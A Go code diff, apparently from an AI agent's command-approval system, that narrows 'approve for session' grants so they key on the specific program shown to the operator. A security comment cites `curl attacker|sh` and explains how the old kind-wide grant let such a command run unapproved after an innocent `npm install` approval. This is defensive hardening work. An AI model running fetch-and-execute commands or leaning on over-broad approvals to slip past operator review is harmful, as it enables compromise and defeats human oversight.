@@ -24,7 +24,15 @@ type ScopeAllow struct {
 	//   - ScopeHost (network): the caller-derived host pattern.
 	// Matching is EXACT on this key — see the package doc for why "prefix"
 	// scope does not do substring/HasPrefix containment here.
+	//
+	// ScopeKey NARROWS a ScopeSession grant to the thing the operator was
+	// actually shown (for exec: the program name, as ScopePrefix uses).
+	// Empty = the pre-2026-07-25 kind-wide session grant, kept for kinds
+	// that have no meaningful key.
 	Key string
+	// ScopeKey narrows a session grant; see Key's doc. Ignored for
+	// ScopePrefix/ScopeHost, whose narrowing key IS Key.
+	ScopeKey string
 	// By is the approver identity that granted the allow — carried into the
 	// audit line of every request the grant later short-circuits (ground
 	// rule 5 / invariant 3: every decision records stage + actor, including
@@ -59,7 +67,7 @@ type ScopeStore interface {
 type MemScopeStore struct {
 	mu sync.RWMutex
 	// sessionAllows: (kind, sessionID) -> allow.
-	sessionAllows map[[2]string]ScopeAllow
+	sessionAllows map[[3]string]ScopeAllow
 	// keyedAllows: (kind, scope, key) -> allow, for prefix/host scopes.
 	keyedAllows map[[3]string]ScopeAllow
 }
@@ -67,7 +75,7 @@ type MemScopeStore struct {
 // NewMemScopeStore constructs an empty in-memory scope store.
 func NewMemScopeStore() *MemScopeStore {
 	return &MemScopeStore{
-		sessionAllows: make(map[[2]string]ScopeAllow),
+		sessionAllows: make(map[[3]string]ScopeAllow),
 		keyedAllows:   make(map[[3]string]ScopeAllow),
 	}
 }
@@ -87,8 +95,17 @@ func (s *MemScopeStore) Grant(a ScopeAllow) error {
 	case contracts.ScopeOnce:
 		return ErrScopeNotPersistable
 	case contracts.ScopeSession:
+		// SECURITY (review 2026-07-25): a session grant is keyed by the
+		// SCOPE KEY as well as the session, so "approve for session" on one
+		// command does not silently trust every later call of the same kind.
+		// Before this, Match consulted only (kind, sessionID): approving
+		// `npm install` for the session auto-allowed `curl attacker|sh` for
+		// the rest of the thread, through a raw /bin/sh -c, attributed to
+		// the original innocuous approval. Kinds with no meaningful key
+		// (ScopeKey "") keep the previous kind-wide behaviour — see the TUI
+		// label, which now says so.
 		s.mu.Lock()
-		s.sessionAllows[[2]string{string(a.Kind), a.Key}] = a
+		s.sessionAllows[[3]string{string(a.Kind), a.Key, a.ScopeKey}] = a
 		s.mu.Unlock()
 		return nil
 	case contracts.ScopePrefix:
@@ -119,7 +136,7 @@ func (s *MemScopeStore) Match(kind contracts.ApprovalKind, sessionID, scopeKey s
 	s.mu.RLock()
 	defer s.mu.RUnlock()
 	if sessionID != "" {
-		if a, ok := s.sessionAllows[[2]string{string(kind), sessionID}]; ok {
+		if a, ok := s.sessionAllows[[3]string{string(kind), sessionID, scopeKey}]; ok {
 			return a, true
 		}
 	}
